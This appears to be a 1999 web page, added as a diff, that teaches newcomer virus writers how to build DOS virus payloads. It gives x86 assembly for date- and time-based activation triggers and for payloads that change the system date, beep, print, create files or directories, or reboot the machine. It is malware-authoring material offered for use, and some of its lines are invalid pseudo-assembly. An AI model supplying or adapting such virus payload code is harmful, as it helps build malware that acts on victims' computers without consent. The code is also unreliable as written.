@@ -1,0 +1,245 @@
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - Small Payload Tutorial</TITLE>
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+<P align="center"> <font color="#004080"><b><font size="+3">Small Payload Tutorial</font><br>
+  <font size="+1">(c) '99 by Acid Bytes</font></b><br>
+  <a href="mailto:acidbytez@gmx.net">acidbytez@gmx.net </a></font></P>
+<hr>
+<P>   
+Hiya VirusWriters,
+</P>
+<P> well that's my first little tutorial. It's written for newbies. Advanced virus 
+  writers won't find anything new here--&gt;so get outta here if beeing advanced 
+  ;) Tracing trough various VX zines and trough VDAT i realized there are not 
+  many payload orientated tutorials available, so i just thought to myself: "Acid, 
+  gotta write one now!". I will try to explain some payload-techniques in this 
+  small tut and that maybe gives you some starting help for your own creations. 
+  <br>
+  This tutorial is leaned on at the payload-part of "<a href="tumisc53.htm">Virus 
+  "Add-Ons</a>"" by Opic [CodeBreakers]. </P>
+<P>
+In most cases you want your payload getting started at a very special point of time.
+That can be a year, a month, a day or even a second. To make that possible, you 'll have
+to put a "date-checking-routine" into your virus. I works this way:
+</P>
+<blockquote>
+  <PRE>
+-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()//
+date_checking:
+mov ah,2ah                 ;gets system date
+int 21h                    ;go!
+cmp cx,dh,dl,al            ;cx=year(1980-2099),dh=month,dl=day,al=day of the week
+                           ;the number must be in HEX!
+je/jne                     ;jump if equal/not equal (for other jump instructions read below)
+                           
+-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()//
+</PRE>
+</blockquote>
+<P>
+The "mov ah,2ah"-function gets the current set system date. It then returns in following
+registers:
+</P>
+<blockquote>
+  <PRE>
+	   CX   - is the year (can be 1980 until 2099)
+	   DH   - is the month (1-12)
+	   DL   - is the day of month (1-31)
+	   AL   - is the day of the week (1h=monday,2h=tuesday,3h=wednesday...)
+</PRE>
+</blockquote>
+<P>
+You will have to compare the returned date in the register to the "payload-wanted" one.
+One important thing is, that you put the date in HEX, Opic forgot to say that in his tut,
+so his example with the "15th of every month" doesn't work.
+Here is my example: To get a payload running only at every friday the 21st use this:
+</P>
+<blockquote>
+  <PRE>
+mov ah,2ah                 ;gets system date
+int 21h                    ;go!
+cmp al,005h                ;check if it's friday
+jne infect                 ;jump to infect if not friday
+cmp dh,15h                 ;check if it's the 21st (21 is 15 in hex)
+jne infect                 ;jump to infect if not the 21st
+payload:
+....
+infect:
+</PRE>
+</blockquote>
+<P>
+Pretty easy, huh? It's nearly the same with hours,minutes and seconds:
+</P>
+<blockquote>
+  <PRE>
+-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()//
+mov ah,2Ch                 ;check time function 
+int 21h                    ;do it!
+cmp al,cl,dh...            ;AL=hour,CL=minutes,DH=seconds,
+JE/JNE                     ;then use JMPs to activate payload
+-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()// 
+</PRE>
+</blockquote>
+<P> 
+The ammount of different jump-possibilities gives you much more possibilities
+than you might think. I have listed them here:
+</P>
+<P> <b>JUMP INSTRUCTIONS: </b></P>
+<blockquote>
+  <PRE>
+	JNE	Jump if Not Equal	
+	JE	Jump if Equal	
+	JMP	Jump			
+	JA	Jump if Above		
+	JB	Jump if Below		
+	JAE     Jump if Above or Equal
+	JBE     Jump if Below or Equal
+	JNA	Jump if Not Above	
+	JLE	Jump if Less or Equal	
+	JL	Jump if Less
+	JZ      Jump if Zero
+	JNZ     Jump if not Zero
+</PRE>
+</blockquote>
+<P>
+There are many more jump instructions, but these are the most common ones.
+Another good checking routine is to make the activation of the payload depend on the DOS-version
+one is using. The routine is following:
+</P>
+<blockquote> 
+  <PRE>
+-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()//
+mov ax,3030h              ;get DOS version function
+int 21h                   ;do!
+cmp al, 00h,01h,...       ;the dos version number is returned in AL
+JE/JNE                    ;use JMP's to activate payload
+-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()//
+</PRE>
+  <p> DOS Version Numbers: </p>
+  <p> 00h = Version 1, 01h = Version 2, 02h = Version 3 etc. </p>
+</blockquote>
+<P> <b>PAYLOADS </b></P>
+<P>
+I have listed common payloads in this part of the tutorial. Just enjoy and be inspired...
+To set a new date use following routine:
+</P>
+<blockquote>
+  <PRE>
+-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()// 
+mov ah,2bh          ;set system date function
+mov cx,dh,dl,al     ;put your date here (see above for whats cx,dh....)
+int 21h             ;go!
+-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()// 
+</PRE>
+</blockquote>
+<P>
+A funny routine, if even old routine is to beep the pc-speaker. Here is it: 
+</P>
+<blockquote>
+  <PRE>
+-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()//
+pc_speaker_beep_routine:
+mov cx, 50                 ;put the number of beeps in CX
+mov ax, 0e07h              ;initialize the speaker...
+int 10h                    ;do it!
+-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()//
+</PRE>
+</blockquote>
+<P> I don't have to explain this one,right? One of the most used is the "show 
+  msg on screen"-payload: </P>
+<blockquote>
+  <PRE>
+-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()//
+show_message_on_screen:
+mov ah,9h                  ;show-text-on-screen function     
+lea dx, message            ;dx=declared message (e.g message db 'Hello',10,13,'$')
+int 21h                    ;do it!
+-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()//
+</PRE>
+</blockquote>
+<P>
+The next payload is pretty interesting, too. It prints something on the printer:
+</P>
+<blockquote>
+  <PRE>
+-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()//
+mov ah,01h         ;printer-function
+mov dx,0h          ;put 0h in dx
+int 17h            ;this interrupt initializes the priner
+lea si,text1       ;puts text1 to si
+mov cx,text1Len    ;move text1len to cx
+ PrintStr:
+mov ah,00h         ;write characters
+lodsb              ;loads stringoperand in akkumulator
+int 17h            ;printer interrupt
+loop PrintStr      ;loops printstr until
+    
+text1Len        EQU EndStr1-String1
+text1     db  'Gotta print it!',0dh,0ah,'$'
+               
+EndStr1:
+-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()//
+</PRE>
+</blockquote>
+<P>
+That's nice, isn't it? K,how about creating something new on your hd? Creating directories
+is bitch easy:
+</P>
+<blockquote>
+  <PRE>
+-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()//
+create_directory:
+mov ah,39h                 ;create-new-directory function
+lea dx, dirname1           ;dx=name of directory (e.g dirname1 db 'DOS',0)
+int 21h                    ;do!
+-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()//
+</PRE>
+</blockquote>
+<P>
+You got 8 chars max. for creating a directory as you should already know.
+Creating a file is not more difficult than creating directories:
+</P>
+<blockquote>
+  <PRE>
+-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()//
+create_new_file:
+mov ah,5bh                 ;create new file function (it also opens it)
+lea dx, filename           ;put filename in dx (e.g filename db 'hello.txt',0)
+mov cx, 00h                ;put file attribute in cx
+int 21h                    ;do it!
+close_file:                ;you have to close the file after creating/opening
+mov ah,3eh                 ;close file function
+int 21h                    ;do it!
+-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()//
+</PRE>
+</blockquote>
+<P>
+As commented in the routine you have to put a file attribute in cx. I have listed them here:
+</P>
+<P> <b>FILE ATTRIBUTES: </b></P>
+<blockquote>
+  <PRE>
+Read Only:    01h
+Hidden:       02h
+System File:  04h
+Volume ID:    08h
+Directory:    10h
+Archive:      20h
+none:         00h
+</PRE>
+</blockquote>
+<P>
+If you are interested in more "agressive" payloads, you are not right here. Like Opic,I won't
+show code for trashing harddisks. You can imagine my opinion in detructive payloads.
+A good anoying payload which is not destructive is just to reboot the system.
+Call the Int 19h instead of passing control to DOS back (Int 20h).
+</P><P>
+I hope you got the idea. This is just a small tutorial with the most common payload ideas.
+You can study Ralph Brown's interrupt list for creating own ideas. Remember, it are mostly
+the payloads which make your virus unique....
+</P>
+<P> Acid Bytes </P>
+<hr>
+</BODY>
+</HTML>
